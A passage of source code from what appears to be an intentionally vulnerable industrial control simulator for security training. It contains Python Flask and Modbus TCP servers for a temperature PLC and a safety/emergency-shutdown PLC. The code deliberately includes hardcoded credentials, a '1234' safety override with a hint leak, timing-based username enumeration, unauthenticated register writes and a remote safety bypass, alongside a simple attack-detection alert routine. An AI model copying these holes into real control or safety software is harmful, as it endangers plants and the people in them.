        if self.server_socket:
            self.server_socket.close()

    def recv_exact(self, sock, size):
        """Receive exactly 'size' bytes from socket"""
        data = b''
        while len(data) < size:
            chunk = sock.recv(size - len(data))
            if not chunk:
                raise ConnectionError("Socket closed before receiving all data")
            data += chunk
        return data

    def _handle_client_with_semaphore(self, client_socket, address):
        """Wrapper to handle client with connection semaphore"""
        with self.connection_semaphore:
            self.handle_client(client_socket, address)

    def handle_client(self, client_socket, address):
        """Handle a client connection"""
        try:
            while True:
                header = self.recv_exact(client_socket, 7)
                transaction_id, protocol_id, length, unit_id = struct.unpack('>HHHB', header)

                if protocol_id != 0:
                    print(f"[MODBUS] PLC3 WARNING: Non-standard protocol ID {protocol_id} from {address}")

                pdu = self.recv_exact(client_socket, length - 1)
                print(f"[MODBUS] PLC3 Request from {address}: Trans={transaction_id}, Unit={unit_id}, PDU={pdu.hex()}")

                function_code = pdu[0]

                # ATTACK DETECTION: Generate visual alert for write operations
                self._detect_attack(address[0], function_code, pdu[1:])

                response_pdu = self.process_request(function_code, pdu[1:])

                response_length = len(response_pdu) + 1
                response_header = struct.pack('>HHHB', transaction_id, protocol_id, response_length, unit_id)

                response = response_header + response_pdu
                client_socket.send(response)
                print(f"[MODBUS] PLC3 Response: {response.hex()}")

        except Exception as e:
            print(f"[MODBUS] PLC3 Error handling client {address}: {e}")
        finally:
            client_socket.close()
            print(f"[MODBUS] PLC3 Client {address} disconnected")

    def process_request(self, function_code, data):
        """Process Modbus request and return response PDU"""
        try:
            if function_code == 0x01:
                return self.read_coils(data)
            elif function_code == 0x03:
                return self.read_holding_registers(data)
            elif function_code == 0x05:
                return self.write_single_coil(data)
            elif function_code == 0x06:
                return self.write_single_register(data)
            elif function_code == 0x0F:
                return self.write_multiple_coils(data)
            elif function_code == 0x10:
                return self.write_multiple_registers(data)
            else:
                return struct.pack('B', function_code | 0x80) + struct.pack('B', 0x01)

        except Exception as e:
            print(f"[MODBUS] PLC3 Error processing request: {e}")
            return struct.pack('B', function_code | 0x80) + struct.pack('B', 0x04)

    def read_holding_registers(self, data):
        """Function Code 0x03: Read Holding Registers"""
        start_addr, count = struct.unpack('>HH', data[:4])
        print(f"[MODBUS] PLC3 Read Holding Registers: addr={start_addr}, count={count}")

        values = []
        for i in range(count):
            register = start_addr + i
            value = shared_state.state_to_register(register)
            values.append(value)

        byte_count = count * 2
        response = struct.pack('BB', 0x03, byte_count)
        for value in values:
            response += struct.pack('>H', value)

        return response

    def write_single_register(self, data):
        """Function Code 0x06: Write Single Register"""
        addr, value = struct.unpack('>HH', data[:4])
        print(f"[MODBUS] PLC3 Write Single Register: addr={addr}, value={value}")

        key, converted_value = shared_state.register_to_state(addr, value)
        if key:
            shared_state.update_state(key, converted_value)
            print(f"[MODBUS] PLC3 Updated {key} = {converted_value}")

        return struct.pack('B', 0x06) + data[:4]

    def write_multiple_registers(self, data):
        """Function Code 0x10: Write Multiple Registers"""
        start_addr, count, byte_count = struct.unpack('>HHB', data[:5])
        print(f"[MODBUS] PLC3 Write Multiple Registers: addr={start_addr}, count={count}")

        values_data = data[5:5+byte_count]
        values = []
        for i in range(count):
            value = struct.unpack('>H', values_data[i*2:(i+1)*2])[0]
            values.append(value)

        for i, value in enumerate(values):
            register = start_addr + i
            key, converted_value = shared_state.register_to_state(register, value)
            if key:
                shared_state.update_state(key, converted_value)
                print(f"[MODBUS] PLC3 Updated {key} = {converted_value}")

        return struct.pack('>BHH', 0x10, start_addr, count)

    def read_coils(self, data):
        """Function Code 0x01: Read Coils"""
        start_addr, count = struct.unpack('>HH', data[:4])
        print(f"[MODBUS] PLC3 Read Coils: addr={start_addr}, count={count}")

        coil_values = []
        for i in range(count):
            coil = start_addr + i
            value = shared_state.state_to_coil(coil)
            coil_values.append(value)

        byte_count = (count + 7) // 8
        packed_bytes = []

        for byte_idx in range(byte_count):
            byte_val = 0
            for bit_idx in range(8):
                coil_idx = byte_idx * 8 + bit_idx
                if coil_idx < count and coil_values[coil_idx]:
                    byte_val |= (1 << bit_idx)
            packed_bytes.append(byte_val)

        response = struct.pack('BB', 0x01, byte_count)
        for byte_val in packed_bytes:
            response += struct.pack('B', byte_val)

        return response

    def write_single_coil(self, data):
        """Function Code 0x05: Write Single Coil"""
        addr, value = struct.unpack('>HH', data[:4])
        coil_state = (value == 0xFF00)
        print(f"[MODBUS] PLC3 Write Single Coil: addr={addr}, value={coil_state}")

        key, bool_value = shared_state.coil_to_state(addr, coil_state)
        if key:
            shared_state.update_state(key, bool_value)
            print(f"[MODBUS] PLC3 Updated {key} = {bool_value}")

        return struct.pack('B', 0x05) + data[:4]

    def write_multiple_coils(self, data):
        """Function Code 0x0F: Write Multiple Coils"""
        start_addr, count, byte_count = struct.unpack('>HHB', data[:5])
        print(f"[MODBUS] PLC3 Write Multiple Coils: addr={start_addr}, count={count}")

        coil_bytes = data[5:5+byte_count]
        coil_values = []

        for byte_idx in range(byte_count):
            byte_val = coil_bytes[byte_idx]
            for bit_idx in range(8):
                if len(coil_values) < count:
                    coil_values.append(bool(byte_val & (1 << bit_idx)))

        for i, value in enumerate(coil_values[:count]):
            coil = start_addr + i
            key, bool_value = shared_state.coil_to_state(coil, value)
            if key:
                shared_state.update_state(key, bool_value)
                print(f"[MODBUS] PLC3 Updated {key} = {bool_value}")

        return struct.pack('>BHH', 0x0F, start_addr, count)

    def _detect_attack(self, source_ip, function_code, data):
        """
        Detect potential attacks and generate visual alerts
        Educational IDS - shows users when their attacks are detected!
        """
        try:
            # Parse address from request data
            address = 0
            if len(data) >= 2:
                address = struct.unpack('>H', data[:2])[0]

            alert = None

            # Detection Rule 1: Write operations (potential attack)
            if function_code in [0x05, 0x06, 0x0F, 0x10]:
                severity = "WARNING"
                alert_type = "UNAUTHORIZED_WRITE"

                # Determine what was written
                target = ""
                if function_code == 0x05:
                    target = f"coil {address}"
                elif function_code == 0x06:
                    target = f"register {address}"
                elif function_code == 0x0F:
                    target = f"multiple coils starting at {address}"
                elif function_code == 0x10:
                    target = f"multiple registers starting at {address}"

                message = f"PLC-3: Modbus write to {target} from {source_ip}"

                # Critical addresses (heaters, coolers)
                if address in [0, 2]:  # Heater, Cooler
                    severity = "CRITICAL"
                    alert_type = "TEMPERATURE_SYSTEM_TAMPER"
                    message = f"ðŸš¨ CRITICAL: PLC-3 Temperature system tampered! Write to {target} from {source_ip}"

                alert = {
                    'timestamp': datetime.now().strftime('%H:%M:%S'),
                    'severity': severity,
                    'type': alert_type,
                    'message': message,
                    'source_ip': source_ip,
                    'function_code': function_code,
                    'address': address,
                    'plc': 'PLC-3'
                }

            # Detection Rule 2: Invalid function codes
            elif function_code not in [0x01, 0x03, 0x05, 0x06, 0x0F, 0x10]:
                alert = {
                    'timestamp': datetime.now().strftime('%H:%M:%S'),
                    'severity': 'HIGH',
                    'type': 'INVALID_FUNCTION_CODE',
                    'message': f"PLC-3: Invalid Modbus function code 0x{function_code:02X} from {source_ip}",
                    'source_ip': source_ip,
                    'function_code': function_code,
                    'address': 0,
                    'plc': 'PLC-3'
                }

            # Store alert in shared state for visual display
            if alert:
                alerts = shared_state.get_state('security_alerts', [])
                alerts.append(alert)

                # Keep only last 50 alerts
                if len(alerts) > 50:
                    alerts = alerts[-50:]

                shared_state.update_state('security_alerts', alerts)
                print(f"[SECURITY] PLC3 {alert['severity']}: {alert['message']}")

        except Exception as e:
            print(f"[SECURITY] PLC3 Error detecting attack: {e}")


def start_modbus_server():
    """Start Modbus TCP server in background thread"""
    modbus_server = ModbusTCPServer(host='0.0.0.0', port=5504)
    server_thread = threading.Thread(target=modbus_server.start, daemon=True)
    server_thread.start()
    print("[STARTUP] PLC3 Modbus server thread started")


if __name__ == '__main__':
    print("""
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘  PLC-3: Temperature Control System                        â•‘
    â•‘  FOR SECURITY TESTING AND EDUCATION ONLY                  â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    Default Credentials:
      engineer / temp123
      technician / control456
      admin / admin

    Web Interface: http://localhost:5012
    Modbus TCP:    localhost:5504

    Known Vulnerabilities:
      â€¢ Insecure firmware upload (no verification)
      â€¢ Insecure deserialization (pickle RCE)
      â€¢ Race conditions in thermal control
      â€¢ No safety interlock verification

    WARNING: DO NOT EXPOSE TO INTERNET
    """)

    # Start Modbus server in background
    start_modbus_server()

    app.run(host='0.0.0.0', port=5012, debug=True)



================================================================================
FILE: core/plc4_safety.py
================================================================================
#!/usr/bin/env python3
"""
PLC-4: Safety/Emergency Shutdown System - Web Interface
Port 5013

INTENTIONALLY VULNERABLE - For security testing only
Vulnerabilities: Weak authentication, timing attacks, safety system bypass
"""

from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from datetime import datetime
import time
import hashlib
import os
import sys
import socket
import struct
import threading
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
import shared_state

app = Flask(__name__, template_folder='../templates')
app.secret_key = 'plc4-safety-weak-key-000'

shared_state.init_state()

# VULNERABILITY: Hardcoded safety credentials
SAFETY_USERS = {
    'safety_eng': 'safe123',
    'operator': 'esd456',
    'admin': 'admin'
}

# VULNERABILITY: Weak override code
SAFETY_OVERRIDE_CODE = '1234'

def get_plc4_state():
    state = shared_state.load_state()
    plc4_state = {}
    for key, value in state.items():
        if key.startswith('plc4_'):
            plc4_state[key.replace('plc4_', '')] = value
    return plc4_state

@app.route('/')
def index():
    if 'username' not in session:
        return redirect(url_for('login'))
    return redirect(url_for('dashboard'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    """VULNERABILITY: Timing attack - username enumeration"""
    error = None
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        # VULNERABILITY: Timing attack reveals valid usernames
        if username in SAFETY_USERS:
            time.sleep(0.2)  # Intentional delay for valid users

            # VULNERABILITY: Password comparison is not constant-time
            correct_pass = SAFETY_USERS[username]
            if password == correct_pass:
                session['username'] = username
                session['plc_id'] = 4
                session['safety_clearance'] = True
                return redirect(url_for('dashboard'))
            else:
                time.sleep(0.1)  # Additional delay for wrong password
                error = 'Invalid password'
        else:
            # Fast response for invalid username
            error = 'Invalid credentials'

    return render_template('plc4_login.html', error=error)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/dashboard')
def dashboard():
    if 'username' not in session:
        return redirect(url_for('login'))

    plc_state = get_plc4_state()
    return render_template('plc4_dashboard.html',
                          username=session['username'],
                          state=plc_state)

@app.route('/api/status')
def api_status():
    plc_state = get_plc4_state()
    return jsonify({
        'plc_id': 4,
        'name': 'Safety/ESD System',
        'status': 'armed' if plc_state.get('safety_system_armed') else 'disarmed',
        'state': plc_state
    })

@app.route('/api/control', methods=['POST'])
def api_control():
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.get_json() or request.form.to_dict()
    action = data.get('action')
    value = data.get('value')

    # Emergency stops
    if action in ['emergency_stop_1', 'emergency_stop_2', 'emergency_stop_3', 'master_emergency_stop']:
        shared_state.update_state(f'plc4_{action}', value in ['true', 'True', True, 1, '1'])

    # Safety interlocks
    elif action in ['safety_interlock_1', 'safety_interlock_2', 'safety_interlock_3']:
        shared_state.update_state(f'plc4_{action}', value in ['true', 'True', True, 1, '1'])

    # Fire/Gas detection
    elif action in ['fire_detection_zone1', 'fire_detection_zone2', 'fire_detection_zone3']:
        shared_state.update_state(f'plc4_{action}', value in ['true', 'True', True, 1, '1'])
    elif action in ['gas_detection_zone1', 'gas_detection_zone2']:
        shared_state.update_state(f'plc4_{action}', value in ['true', 'True', True, 1, '1'])

    # Fire suppression & evacuation
    elif action in ['fire_suppression_active', 'evacuation_alarm']:
        shared_state.update_state(f'plc4_{action}', value in ['true', 'True', True, 1, '1'])

    # VULNERABILITY: Safety bypass can be enabled without additional checks
    elif action == 'safety_bypass_mode':
        shared_state.update_state('plc4_safety_bypass_mode', value in ['true', 'True', True, 1, '1'])
        if value:
            return jsonify({
                'success': True,
                'warning': 'SAFETY BYPASS ENABLED - All safety systems disabled!',
                'action': action
            })

    # Watchdog
    elif action == 'watchdog_enabled':
        shared_state.update_state('plc4_watchdog_enabled', value in ['true', 'True', True, 1, '1'])

    elif action == 'reset_watchdog':
        shared_state.update_state('plc4_watchdog_counter', 0)

    elif action == 'reset_all_alarms':
        shared_state.update_state('plc4_master_emergency_stop', False)
        shared_state.update_state('plc4_evacuation_alarm', False)
        shared_state.update_state('plc4_fire_suppression_active', False)

    return jsonify({'success': True, 'action': action, 'value': value})

@app.route('/api/safety_override', methods=['POST'])
def safety_override():
    """VULNERABILITY: Weak override code allows safety bypass"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    override_code = request.form.get('code', '')

    # VULNERABILITY: Simple string comparison, weak code
    if override_code == SAFETY_OVERRIDE_CODE:
        # Reset watchdog and enable bypass
        shared_state.update_state('plc4_watchdog_counter', 0)
        shared_state.update_state('plc4_safety_bypass_mode', True)
        shared_state.update_state('plc4_system_healthy', True)

        return jsonify({
            'success': True,
            'message': 'Safety override accepted - All safety systems bypassed',
            'warning': 'CRITICAL: Safety systems are now disabled!'
        })
    else:
        # VULNERABILITY: Response reveals if code is close
        if override_code.startswith('12'):
            return jsonify({
                'error': 'Invalid code',
                'hint': 'Code starts correctly...'
            }), 401
        else:
            return jsonify({'error': 'Invalid override code'}), 401

@app.route('/api/emergency_shutdown', methods=['POST'])
def emergency_shutdown():
    """Trigger full emergency shutdown"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    # Activate all emergency stops
    shared_state.update_state('plc4_master_emergency_stop', True)
    shared_state.update_state('plc4_emergency_stop_1', True)
    shared_state.update_state('plc4_emergency_stop_2', True)
    shared_state.update_state('plc4_emergency_stop_3', True)
    shared_state.update_state('plc4_evacuation_alarm', True)

    # Also trigger emergency stops on other PLCs
    shared_state.update_state('plc2_emergency_vent', True)
    shared_state.update_state('plc3_thermal_runaway', False)

    return jsonify({
        'success': True,
        'message': 'EMERGENCY SHUTDOWN ACTIVATED',
        'affected_systems': ['PLC-1', 'PLC-2', 'PLC-3', 'PLC-4']
    })

@app.route('/api/simulate_incident', methods=['POST'])
def simulate_incident():
    """VULNERABILITY: Allows simulating various incidents for testing"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    incident_type = request.form.get('type', 'fire')

    if incident_type == 'fire':
        shared_state.update_state('plc4_fire_detection_zone1', True)
        shared_state.update_state('plc4_fire_detection_zone2', True)
        return jsonify({'success': True, 'incident': 'Fire detected in zones 1 and 2'})

    elif incident_type == 'gas':
        shared_state.update_state('plc4_gas_detection_zone1', True)
        return jsonify({'success': True, 'incident': 'Gas leak detected in zone 1'})

    elif incident_type == 'multiple':
        shared_state.update_state('plc4_fire_detection_zone1', True)
        shared_state.update_state('plc4_gas_detection_zone2', True)
        shared_state.update_state('plc4_emergency_stop_1', True)
        return jsonify({'success': True, 'incident': 'Multiple simultaneous incidents'})

    return jsonify({'error': 'Invalid incident type'}), 400

@app.route('/api/audit_log')
def audit_log():
    """Get safety audit log"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    # Simulate audit log entries
    logs = [
        {'timestamp': '2024-12-07 10:30:15', 'event': 'System armed', 'user': 'safety_eng'},
        {'timestamp': '2024-12-07 10:35:22', 'event': 'Watchdog reset', 'user': 'operator'},
        {'timestamp': '2024-12-07 10:40:10', 'event': 'Safety bypass enabled', 'user': 'admin'},
        {'timestamp': '2024-12-07 10:41:33', 'event': 'Emergency stop triggered', 'user': 'operator'},
        {'timestamp': '2024-12-07 10:45:00', 'event': 'System reset', 'user': 'safety_eng'},
    ]

    return jsonify({'logs': logs})


class ModbusTCPServer:
    """
    Minimal Modbus TCP Server - Intentionally Vulnerable

    Implements only basic function codes:
    - 0x03: Read Holding Registers
    - 0x06: Write Single Register
    - 0x10: Write Multiple Registers

    VULNERABILITIES (INTENTIONAL):
    - No authentication
    - No bounds checking
    - No input validation
    - Allows writing to any register
    - No rate limiting (connection limit exists but is bypassable)
    - No logging of malicious activity
    """

    def __init__(self, host='0.0.0.0', port=5505, max_connections=50):
        self.host = host
        self.port = port
        self.server_socket = None
        self.running = False
        self.connection_semaphore = threading.Semaphore(max_connections)

    def start(self):
        """Start the Modbus TCP server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.settimeout(1.0)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True

            print(f"[MODBUS] PLC4 Server started on {self.host}:{self.port}")

            while self.running:
                try:
                    client_socket, address = self.server_socket.accept()
                    print(f"[MODBUS] PLC4 Client connected from {address}")

                    client_thread = threading.Thread(
                        target=self._handle_client_with_semaphore,
                        args=(client_socket, address),
                        daemon=True
                    )
                    client_thread.start()

                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        print(f"[MODBUS] PLC4 Error accepting connection: {e}")

        except Exception as e:
            print(f"[MODBUS] PLC4 Failed to start server: {e}")

    def stop(self):
        """Stop the Modbus TCP server"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()

    def recv_exact(self, sock, size):
        """Receive exactly 'size' bytes from socket"""
        data = b''
        while len(data) < size:
            chunk = sock.recv(size - len(data))
            if not chunk:
                raise ConnectionError("Socket closed before receiving all data")
            data += chunk
        return data

    def _handle_client_with_semaphore(self, client_socket, address):
        """Wrapper to handle client with connection semaphore"""
        with self.connection_semaphore:
            self.handle_client(client_socket, address)

    def handle_client(self, client_socket, address):
        """Handle a client connection"""
        try:
            while True:
                header = self.recv_exact(client_socket, 7)
                transaction_id, protocol_id, length, unit_id = struct.unpack('>HHHB', header)

                if protocol_id != 0:
                    print(f"[MODBUS] PLC4 WARNING: Non-standard protocol ID {protocol_id} from {address}")

                pdu = self.recv_exact(client_socket, length - 1)
                print(f"[MODBUS] PLC4 Request from {address}: Trans={transaction_id}, Unit={unit_id}, PDU={pdu.hex()}")

                function_code = pdu[0]

                # ATTACK DETECTION: Generate visual alert for write operations
                self._detect_attack(address[0], function_code, pdu[1:])

                response_pdu = self.process_request(function_code, pdu[1:])

                response_length = len(response_pdu) + 1
                response_header = struct.pack('>HHHB', transaction_id, protocol_id, response_length, unit_id)

                response = response_header + response_pdu
                client_socket.send(response)
                print(f"[MODBUS] PLC4 Response: {response.hex()}")

        except Exception as e:
            print(f"[MODBUS] PLC4 Error handling client {address}: {e}")
        finally:
            client_socket.close()
            print(f"[MODBUS] PLC4 Client {address} disconnected")

    def process_request(self, function_code, data):
        """Process Modbus request and return response PDU"""
        try:
            if function_code == 0x01:
                return self.read_coils(data)
            elif function_code == 0x03:
                return self.read_holding_registers(data)
            elif function_code == 0x05:
                return self.write_single_coil(data)
            elif function_code == 0x06:
                return self.write_single_register(data)
            elif function_code == 0x0F:
                return self.write_multiple_coils(data)
            elif function_code == 0x10:
                return self.write_multiple_registers(data)
            else:
                return struct.pack('B', function_code | 0x80) + struct.pack('B', 0x01)

        except Exception as e:
            print(f"[MODBUS] PLC4 Error processing request: {e}")
            return struct.pack('B', function_code | 0x80) + struct.pack('B', 0x04)

    def read_holding_registers(self, data):
        """Function Code 0x03: Read Holding Registers"""
        start_addr, count = struct.unpack('>HH', data[:4])
        print(f"[MODBUS] PLC4 Read Holding Registers: addr={start_addr}, count={count}")

        values = []
        for i in range(count):
            register = start_addr + i
            value = shared_state.state_to_register(register)
            values.append(value)

        byte_count = count * 2
        response = struct.pack('BB', 0x03, byte_count)
        for value in values:
            response += struct.pack('>H', value)

        return response

    def write_single_register(self, data):
        """Function Code 0x06: Write Single Register"""
        addr, value = struct.unpack('>HH', data[:4])
        print(f"[MODBUS] PLC4 Write Single Register: addr={addr}, value={value}")

        key, converted_value = shared_state.register_to_state(addr, value)
        if key:
            shared_state.update_state(key, converted_value)
            print(f"[MODBUS] PLC4 Updated {key} = {converted_value}")

        return struct.pack('B', 0x06) + data[:4]

    def write_multiple_registers(self, data):
        """Function Code 0x10: Write Multiple Registers"""
        start_addr, count, byte_count = struct.unpack('>HHB', data[:5])
        print(f"[MODBUS] PLC4 Write Multiple Registers: addr={start_addr}, count={count}")

        values_data = data[5:5+byte_count]
        values = []
        for i in range(count):
            value = struct.unpack('>H', values_data[i*2:(i+1)*2])[0]
            values.append(value)

        for i, value in enumerate(values):
            register = start_addr + i
            key, converted_value = shared_state.register_to_state(register, value)
            if key:
                shared_state.update_state(key, converted_value)
                print(f"[MODBUS] PLC4 Updated {key} = {converted_value}")

        return struct.pack('>BHH', 0x10, start_addr, count)

    def read_coils(self, data):
        """Function Code 0x01: Read Coils"""
        start_addr, count = struct.unpack('>HH', data[:4])
        print(f"[MODBUS] PLC4 Read Coils: addr={start_addr}, count={count}")

        coil_values = []
        for i in range(count):
            coil = start_addr + i
            value = shared_state.state_to_coil(coil)
            coil_values.append(value)

        byte_count = (count + 7) // 8
        packed_bytes = []

        for byte_idx in range(byte_count):
            byte_val = 0
            for bit_idx in range(8):
                coil_idx = byte_idx * 8 + bit_idx
                if coil_idx < count and coil_values[coil_idx]:
                    byte_val |= (1 << bit_idx)
            packed_bytes.append(byte_val)

        response = struct.pack('BB', 0x01, byte_count)
        for byte_val in packed_bytes:
            response += struct.pack('B', byte_val)

        return response

    def write_single_coil(self, data):
        """Function Code 0x05: Write Single Coil"""
        addr, value = struct.unpack('>HH', data[:4])
        coil_state = (value == 0xFF00)
        print(f"[MODBUS] PLC4 Write Single Coil: addr={addr}, value={coil_state}")

        key, bool_value = shared_state.coil_to_state(addr, coil_state)
        if key:
            shared_state.update_state(key, bool_value)
            print(f"[MODBUS] PLC4 Updated {key} = {bool_value}")

        return struct.pack('B', 0x05) + data[:4]

    def write_multiple_coils(self, data):
        """Function Code 0x0F: Write Multiple Coils"""
        start_addr, count, byte_count = struct.unpack('>HHB', data[:5])
        print(f"[MODBUS] PLC4 Write Multiple Coils: addr={start_addr}, count={count}")

        coil_bytes = data[5:5+byte_count]
        coil_values = []

        for byte_idx in range(byte_count):
            byte_val = coil_bytes[byte_idx]
            for bit_idx in range(8):
                if len(coil_values) < count:
                    coil_values.append(bool(byte_val & (1 << bit_idx)))

        for i, value in enumerate(coil_values[:count]):
            coil = start_addr + i
            key, bool_value = shared_state.coil_to_state(coil, value)
            if key:
                shared_state.update_state(key, bool_value)
                print(f"[MODBUS] PLC4 Updated {key} = {bool_value}")

        return struct.pack('>BHH', 0x0F, start_addr, count)

    def _detect_attack(self, source_ip, function_code, data):
        """
        Detect potential attacks and generate visual alerts
        Educational IDS - shows users when their attacks are detected!
        """
        try:
            # Parse address from request data
            address = 0
            if len(data) >= 2:
                address = struct.unpack('>H', data[:2])[0]

            alert = None

            # Detection Rule 1: Write operations (potential attack)
            if function_code in [0x05, 0x06, 0x0F, 0x10]:
                # PLC-4 is SAFETY SYSTEM - ALL writes are CRITICAL!
                severity = "CRITICAL"
                alert_type = "SAFETY_SYSTEM_TAMPER"

                # Determine what was written
                target = ""
                if function_code == 0x05:
                    target = f"coil {address}"
                elif function_code == 0x06:
                    target = f"register {address}"
                elif function_code == 0x0F:
                    target = f"multiple coils starting at {address}"
                elif function_code == 0x10:
                    target = f"multiple registers starting at {address}"

                message = f"ðŸš¨ CRITICAL: PLC-4 SAFETY SYSTEM tampered! Write to {target} from {source_ip}"

                # Extra critical for emergency stop and safety interlock
                if address in [0, 1]:
                    message = f"ðŸš¨ðŸš¨ðŸš¨ CRITICAL: PLC-4 Emergency safety controls disabled! Write to {target} from {source_ip}"

                alert = {
                    'timestamp': datetime.now().strftime('%H:%M:%S'),
                    'severity': severity,
                    'type': alert_type,
                    'message': message,
                    'source_ip': source_ip,
                    'function_code': function_code,
                    'address': address,
                    'plc': 'PLC-4'
                }

            # Detection Rule 2: Invalid function codes
            elif function_code not in [0x01, 0x03, 0x05, 0x06, 0x0F, 0x10]:
                alert = {
                    'timestamp': datetime.now().strftime('%H:%M:%S'),
                    'severity': 'HIGH',
                    'type': 'INVALID_FUNCTION_CODE',
                    'message': f"PLC-4: Invalid Modbus function code 0x{function_code:02X} from {source_ip}",
                    'source_ip': source_ip,
                    'function_code': function_code,
                    'address': 0,
                    'plc': 'PLC-4'
                }

            # Store alert in shared state for visual display
            if alert:
                alerts = shared_state.get_state('security_alerts', [])
                alerts.append(alert)

                # Keep only last 50 alerts
                if len(alerts) > 50:
                    alerts = alerts[-50:]

                shared_state.update_state('security_alerts', alerts)
                print(f"[SECURITY] PLC4 {alert['severity']}: {alert['message']}")

        except Exception as e:
            print(f"[SECURITY] PLC4 Error detecting attack: {e}")


def start_modbus_server():
    """Start Modbus TCP server in background thread"""
    modbus_server = ModbusTCPServer(host='0.0.0.0', port=5505)
    server_thread = threading.Thread(target=modbus_server.start, daemon=True)
    server_thread.start()
    print("[STARTUP] PLC4 Modbus server thread started")


if __name__ == '__main__':
    print("""
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘  PLC-4: Safety/Emergency Shutdown System                  â•‘
    â•‘  FOR SECURITY TESTING AND EDUCATION ONLY                  â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    Default Credentials:
      safety_eng / safe123
      operator / esd456
      admin / admin

    Safety Override Code: 1234

    Web Interface: http://localhost:5013
    Modbus TCP:    localhost:5505

    Known Vulnerabilities:
      â€¢ Timing attacks in authentication
      â€¢ Weak safety override code (1234)
      â€¢ Safety bypass can be enabled remotely
      â€¢ No multi-factor authentication for critical functions
      â€¢ Watchdog can be disabled
      â€¢ Information disclosure in failed override attempts

    CRITICAL WARNING:
      This is a SAFETY SYSTEM simulator. In real systems, these
      vulnerabilities would be catastrophic and potentially fatal.
      DO NOT EXPOSE TO INTERNET.
    """)

    # Start Modbus server in background
    start_modbus_server()

    app.run(host='0.0.0.0', port=5013, debug=True)



================================================================================
FILE: core/plc_engine.py
================================================================================
#!/usr/bin/env python3
"""
Realistic PLC Simulation Engine
Implements scan cycle, ladder logic execution, and proper PLC states
"""

import time
import threading
import logging
from enum import Enum
from dataclasses import dataclass
from typing import List, Dict, Any, Callable
import shared_state

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

class PLCState(Enum):
    """PLC operating states"""
    STOP = "STOP"
    RUN = "RUN"
    PROGRAM = "PROGRAM"
    ERROR = "ERROR"

class InstructionType(Enum):
    """Ladder logic instruction types"""
    LD = "LD"      # Load (normally open contact)
    LDN = "LDN"    # Load NOT (normally closed contact)
    AND = "AND"    # AND
    OR = "OR"      # OR
    OUT = "OUT"    # Output coil
    TON = "TON"    # Timer ON-delay
    CTU = "CTU"    # Counter UP
    MOV = "MOV"    # Move/assign value
    ADD = "ADD"    # Addition
    SUB = "SUB"    # Subtraction
    CMP = "CMP"    # Compare

@dataclass
class Instruction:
    """Single ladder logic instruction"""
    type: InstructionType
    operands: List[str]
    comment: str = ""

@dataclass
class Timer:
    """PLC Timer"""
    preset: float
    elapsed: float = 0.0
    running: bool = False
    done: bool = False

@dataclass
class Counter:
    """PLC Counter"""
    preset: int
    count: int = 0
    done: bool = False

class PLCEngine:
    """
    Realistic PLC simulation engine

    Features:
    - Cyclic scan execution (typical 10-100ms)
    - Input/Output image tables
    - Ladder logic interpreter
    - PLC states (RUN/STOP/PROGRAM)
    - Watchdog timer
    """

    def __init__(self, plc_id: str, scan_time_ms: int = 50):
        self.plc_id = plc_id
        self.scan_time = scan_time_ms / 1000.0  # Convert to seconds
        self.state = PLCState.STOP

        # Memory areas (like real PLCs)
        self.input_image = {}      # I0.0, I0.1, etc.
        self.output_image = {}     # Q0.0, Q0.1, etc.
        self.memory_bits = {}      # M0.0, M0.1, etc.
        self.data_blocks = {}      # DB1, DB2, etc.

        # Timers and counters
        self.timers = {}
        self.counters = {}

        # Ladder logic program
        self.program: List[Instruction] = []

        # Execution state
        self.accumulator = False  # Current logic state
        self.scan_count = 0
        self.last_scan_time = 0.0
        self.max_scan_time = 0.0
        self.watchdog_timeout = 1.0  # 1 second watchdog
        self.last_watchdog_reset = time.time()

        # Background thread
        self.running = False
        self.thread = None

        shared_state.init_state()

    def load_program(self, program: List[Instruction]):
        """Load ladder logic program"""
        self.program = program
        log.info(f"[{self.plc_id}] Loaded program with {len(program)} instructions")

    def set_state(self, new_state: PLCState):
        """Change PLC state"""
        old_state = self.state
        self.state = new_state
        log.info(f"[{self.plc_id}] State change: {old_state.value} -> {new_state.value}")

        # Update shared state
        shared_state.update_state(f'{self.plc_id}_state', new_state.value)

    def start(self):
        """Start the PLC engine"""
        if self.running:
            return

        self.running = True
        self.state = PLCState.RUN
        self.thread = threading.Thread(target=self._scan_cycle, daemon=True)
        self.thread.start()
        log.info(f"[{self.plc_id}] PLC engine started (scan time: {self.scan_time*1000:.1f}ms)")

    def stop(self):
        """Stop the PLC engine"""
        self.running = False
        self.state = PLCState.STOP
        if self.thread:
            self.thread.join(timeout=2.0)
